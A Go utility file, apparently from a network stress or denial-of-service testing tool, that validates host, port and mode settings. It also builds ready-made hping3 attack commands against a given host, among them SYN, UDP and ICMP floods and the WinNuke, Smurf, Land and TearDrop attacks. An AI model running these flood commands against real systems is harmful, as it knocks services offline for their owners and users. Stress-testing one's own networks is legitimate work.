package utils

import (
	"fmt"
	"net"
	"os"
)

type CheckAPP struct{}

func (c *CheckAPP) CheckHost(host string) {
	ip := net.ParseIP(host)
	if ip == nil || ip.To4() == nil {
		c.CheckExit("Please check format of host: e.g. 1.2.3.4")
	} else {
		return
	}

}
func (c *CheckAPP) CheckDepth(depth int) {
	return
}
func (c *CheckAPP) CheckSendMode(mode string) {
	switch mode {
	case "TCP":
		{
			return
		}
	case "UDP":
		{
			return
		}
	default:
		c.CheckExit("Please check format of send mode: e.g. \"TCP\",\"UDP\"")
	}
}
func (c *CheckAPP) CheckPort(port int) {
	if port >= 1 && port <= 65535 {
		return
	} else {
		c.CheckExit("Please check format of port : e.g. 1-65535 ")
	}
}
func (c *CheckAPP) CheckAutoMode(mode string) [][2]interface{} {
	switch mode {
	case "TCP":
		{
			return Output.Execute("TCP")
		}
	case "UDP":
		{
			return Output.Execute("UDP")
		}
	case "ICS":
		{
			return Output.Execute("ICS")
		}
	case "BLACK":
		{
			return Output.Execute("BLACK")
		}
	default:
		c.CheckExit("Please check format of send mode: e.g. \"TCP\",\"UDP\",BLACK,ICS")
		return nil
	}
}
func (c *CheckAPP) CheckHpingMode(config ProtoAPP) string {
	_mode := map[string]string{
		"TCP":      "hping3 -c 1000 -d 120 -S -p 10086 --flood " + config.Host,
		"UDP":      "hping3 " + config.Host + " -c 1000 --flood -2 -p 10086",
		"ICMP":     "hping3 " + config.Host + " -c 1000 --flood -1 ",
		"WinNuke":  "hping3 -d 120 -U " + config.Host + " -p 139",
		"Smurf":    "hping3 -1 " + config.Host + " --flood",
		"Land":     "hping3 -d 120 -S -a " + config.Host + " -p 10086 " + config.Host,
		"TearDrop": "hping3 " + config.Host + " -2 -d 5000 --fragoff 1200 --frag --mtu 1000",
		"MAXICMP":  "hping3 " + config.Host + " -c 10000 -d 5000 --flood -1 --rand-source",
	}
	if _mode[config.Mode] != "" {
		return _mode[config.Mode]
	} else {
		c.CheckExit("Please check format of Hping mode: e.g. \"TCP\", \"UDP\", \"ICMP\", \"WinNuke\", \"Smurf\", \"Land\", \"TearDrop\", \"MAXICMP\"")
		return ""
	}

}
func (c *CheckAPP) CheckSend(config *ProtoAPP) *ProtoAPP {
	c.CheckSendMode(config.Mode)
	c.CheckHost(config.Host)
	c.CheckPort(config.Port)
	c.CheckDepth(config.Depth)
	return config
}
func (c *CheckAPP) CheckDDos(config *ProtoAPP) *ProtoAPP {
	c.CheckDDosMode(config.Mode)
	c.CheckHost(config.Host)
	c.CheckPort(config.Port)
	return config
}

func (c *CheckAPP) CheckAuto(config *ProtoAPP) [][2]interface{} {
	c.CheckHost(config.Host)
	c.CheckDepth(config.Depth)
	return c.CheckAutoMode(config.Mode)
}

func (c *CheckAPP) CheckSnmp(config *ProtoAPP) *ProtoAPP {
	c.CheckHost(config.Host)
	return config
}

func (c *CheckAPP) CheckServer(config *ProtoAPP) *ProtoAPP {
	c.CheckServerMode(config.Mode)
	c.CheckHost(config.Host)
	return config
}

func (c *CheckAPP) CheckExit(err string) {
	fmt.Fprintf(os.Stderr, "Fatal error: %s\n ", err)
	os.Exit(1)
}
func (c *CheckAPP) CheckDebug(debug string) {
	fmt.Fprintf(os.Stderr, "debug:  %s\n ", debug)
	os.Exit(1)
}
func (c *CheckAPP) CheckError(err error) {
	if err != nil {
		_, _ = fmt.Fprintf(os.Stderr, "Fatal error: %s\n ", err.Error())
		os.Exit(1)
	}
}
func (c *CheckAPP) CheckTimeout(err error) string {
	fmt.Fprintf(os.Stderr, "Fatal error: %s\n ", err)
	return ""
}

func (c *CheckAPP) CheckServerMode(mode string) {
	switch mode {
	case "TCP":
		{
			return
		}
	case "UDP":
		{
			return
		}
	default:
		c.CheckExit("Please check format of Server mode: e.g. \"TCP\", \"UDP\"")
	}
}

func (c *CheckAPP) CheckDDosMode(mode string) {
	switch mode {
	case "TCP":
		{
			return
		}
	case "UDP":
		{
			return
		}
	case "ICMP":
		return
	default:
		c.CheckExit("Please check format of Server mode: e.g. \"TCP\", \"UDP\",\"ICMP\" ")
	}
}

func (c *CheckAPP) CheckDepthSum(config *ProtoAPP) bool {
	config.Depth -= 1
	if config.Depth == 0 {
		Check.CheckDebug(config.Mode + " Task execution completed......")
	}
	return true

}

var Check CheckAPP
